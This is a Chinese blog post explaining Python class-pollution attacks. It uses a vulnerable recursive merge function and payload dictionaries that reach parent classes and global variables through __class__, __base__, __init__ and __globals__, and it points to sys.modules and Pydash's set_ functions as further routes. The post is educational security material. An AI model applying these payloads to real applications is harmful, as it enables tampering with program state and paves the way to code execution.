<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>python原型链污染 | have a good time!</title><meta name="author" content="mervin"><meta name="copyright" content="mervin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="python原型链污染 不是所有类的属性都可以被污染的； 对所有类的方法无效   [!IMPORTANT] ——注： 我们只能更改对应区域的参数内容**(改属性、变量)**，并不能自己实现命令的执行； 要有其他区域来协助实现回显&#x2F;执行。  合并函数——实现污染的一种方式 123456789101112131415def merge(src, dst):    # Recursive me">
<meta property="og:type" content="article">
<meta property="og:title" content="python原型链污染">
<meta property="og:url" content="http://example.com/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
<meta property="og:site_name" content="have a good time!">
<meta property="og:description" content="python原型链污染 不是所有类的属性都可以被污染的； 对所有类的方法无效   [!IMPORTANT] ——注： 我们只能更改对应区域的参数内容**(改属性、变量)**，并不能自己实现命令的执行； 要有其他区域来协助实现回显&#x2F;执行。  合并函数——实现污染的一种方式 123456789101112131415def merge(src, dst):    # Recursive me">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p111223.github.io/imgs/2025-04-29%20212727.png">
<meta property="article:published_time" content="2025-11-25T12:47:32.000Z">
<meta property="article:modified_time" content="2025-11-25T13:11:54.389Z">
<meta property="article:author" content="mervin">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p111223.github.io/imgs/2025-04-29%20212727.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "python原型链污染",
  "url": "http://example.com/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
  "image": "https://p111223.github.io/imgs/2025-04-29 212727.png",
  "datePublished": "2025-11-25T12:47:32.000Z",
  "dateModified": "2025-11-25T13:11:54.389Z",
  "author": [
    {
      "@type": "Person",
      "name": "mervin",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'python原型链污染',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://p111223.github.io/imgs/avatar-icon.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://p111223.github.io/imgs/2025-04-29 212727.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://p111223.github.io/imgs/2025-05-19 230655.png" alt="Logo"><span class="site-name">have a good time!</span></a><a class="nav-page-title" href="/"><span class="site-name">python原型链污染</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">python原型链污染</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-25T12:47:32.000Z" title="发表于 2025-11-25 20:47:32">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-25T13:11:54.389Z" title="更新于 2025-11-25 21:11:54">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h1><ul>
<li>不是所有类的属性都可以被污染的；</li>
<li>对所有类的方法无效</li>
</ul>
<blockquote>
<p>[!IMPORTANT]</p>
<p>——注：</p>
<p>我们只能更改对应区域的参数内容**(改属性、变量)**，并不能自己实现命令的执行；</p>
<p>要有其他区域来协助实现回显&#x2F;执行。</p>
</blockquote>
<h2 id="合并函数"><a href="#合并函数" class="headerlink" title="合并函数"></a>合并函数</h2><p>——实现污染的一种方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#可创建新的属性</span></span><br><span class="line">            <span class="comment">#可实现多个属性操作（即一个&#123;&#125;中用，实现多个</span></span><br></pre></td></tr></table></figure>

<p>作用：差不多是ssti的方式，这个是以<strong>dict形式</strong>包含来<strong>体现层次</strong>；</p>
<ul>
<li><p>src为payload（即dict形式）</p>
</li>
<li><p>dst为对象</p>
</li>
</ul>
<p>即可以修改自定义属性，也可以修改<code>&quot;__...__&quot;</code>的内置属性；</p>
<p><code>object</code>的属性是无法被污染的；</p>
<p>目前<code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数有<code>merge</code>函数类似的类属性赋值逻辑，，能实现污染攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    classa = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">            <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;classa&quot;</span>:<span class="number">5</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(B.classa)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(B.classa)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<p>就实现了对参数的更改</p>
<img src="https://p111223.github.io/2025/11/25/python原型链污染/image-20251125194637670.png" />

<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><h3 id="class-和-base-的利用"><a href="#class-和-base-的利用" class="headerlink" title="__class__和__base__的利用"></a><code>__class__</code>和<code>__base__</code>的利用</h3><ul>
<li><code>__class__</code>：获取当前的类对象——操作的对象可以为类、实例对象</li>
<li><code>__base__</code>：获取当前类的父类——操作对象只能是类；有多个时，只能获取第一个</li>
<li><code>__bases__</code>：获取所有父类</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用__base__</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    classa = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">B</span>):<span class="comment">#一个父类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:&#123;<span class="comment">#切换到父类</span></span><br><span class="line">            <span class="string">&quot;classa&quot;</span>: <span class="number">3</span><span class="comment">#改属性值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(B.classa)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(B.classa)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<img src="https://p111223.github.io/2025/11/25/python原型链污染//image-20251125200842505.png" />

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    classa = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    classc = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(B, C):<span class="comment">#两个父类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:&#123;<span class="comment">#用__base__，而不是__bases__</span></span><br><span class="line">            <span class="string">&quot;classa&quot;</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;classc&quot;</span>:<span class="number">5</span><span class="comment">#是第二个父类的内容</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(B.classa)</span><br><span class="line"><span class="built_in">print</span>(C.classc)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(B.classa)</span><br><span class="line"><span class="built_in">print</span>(C.classc)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">——最终，可以执行，但第二个父类的属性没有被修改</span><br></pre></td></tr></table></figure>

<img src="https://p111223.github.io/2025/11/25/python原型链污染/image-20251125201209580.png" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">a = 1</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">def demo():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class B:</span><br><span class="line">    classa = 2</span><br><span class="line"></span><br><span class="line">class C:</span><br><span class="line">    classc = 3</span><br><span class="line"></span><br><span class="line">class A(B, C):#存在多个父类</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;__bases__&quot;:&#123;#用__bases__</span><br><span class="line">            &quot;classa&quot;: 3,</span><br><span class="line">            &quot;classc&quot;:5</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print(B.classa)</span><br><span class="line">print(C.classc)</span><br><span class="line">print(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(B.classa)</span><br><span class="line">print(C.classc)</span><br><span class="line">print(a)</span><br><span class="line">——实现不了</span><br><span class="line">——但可以通过__bases[n]__获取对应的父类（小tip）</span><br></pre></td></tr></table></figure>

<img src="https://p111223.github.io/2025/11/25/python原型链污染/image-20251125203751806.png" />

<p>——获取k、v，进入递归</p>
<img src="https://p111223.github.io/2025/11/25/python原型链污染/image-20251125203829379.png" />

<p>——发现现在dst是元组了，元组没有<code>.get()</code>方法——报错了</p>
<p>——三个父类，dst也是元组，即<code>__bases__</code>返回的是元组</p>
<h3 id="init-globals-利用"><a href="#init-globals-利用" class="headerlink" title="__init__+__globals__利用"></a><code>__init__</code>+<code>__globals__</code>利用</h3><p>前提：显示重写<code>__init__</code>方法</p>
<p>除了简单的继承关系，也可以通过<code>__init__</code>和<code>__globals__</code>属性来实现更多操作</p>
<p>原因：</p>
<ul>
<li>python中所有用<code>def</code>定义的函数（包括类中实现的方法）在底层都是<code>function</code>类型的对象</li>
<li><code>function</code>对象有一个特殊的属性：<code>__globals__</code>（字典，指向该<strong>函数定义时所在的全局命名空间</strong>）</li>
<li>没有重写<code>__init__</code>的话，<code>__init__</code>来自<code>object</code>，是C实现的，没有<code>__globals__</code>属性</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">obj = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> :&#123;</span><br><span class="line">            <span class="string">&quot;var_new&quot;</span> : <span class="number">666</span>, <span class="comment">#可创建新的属性</span></span><br><span class="line">            <span class="string">&quot;a_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;answer_1&quot;</span> : <span class="string">&quot;可实现多个属性操作&quot;</span> <span class="comment">#可实现多个属性操作</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a_1.answer_1)</span><br><span class="line">merge(payload, obj)</span><br><span class="line"><span class="built_in">print</span>(a_1.answer_1)</span><br><span class="line"><span class="built_in">print</span>(var_new)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">print</span>(obj.__init__.globals__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#__globals__后，可调用func，var，modules</span></span><br><span class="line"><span class="comment">#可以通过sys模块的modules来操作已经加载过的模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#而**前提**：sys要import先，print(obj.__init__.__globals__[&#x27;sys&#x27;])#globals是字典，用[]</span></span><br><span class="line"><span class="comment">#sys是模块对象,用.</span></span><br><span class="line"><span class="comment">#print(obj.__init__.__globals__[&#x27;sys&#x27;].modules)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过sys模块的modules来操作<strong>已经加载过的模块</strong></p>
<p>而<strong>前提</strong>：<code>import sys</code>先</p>
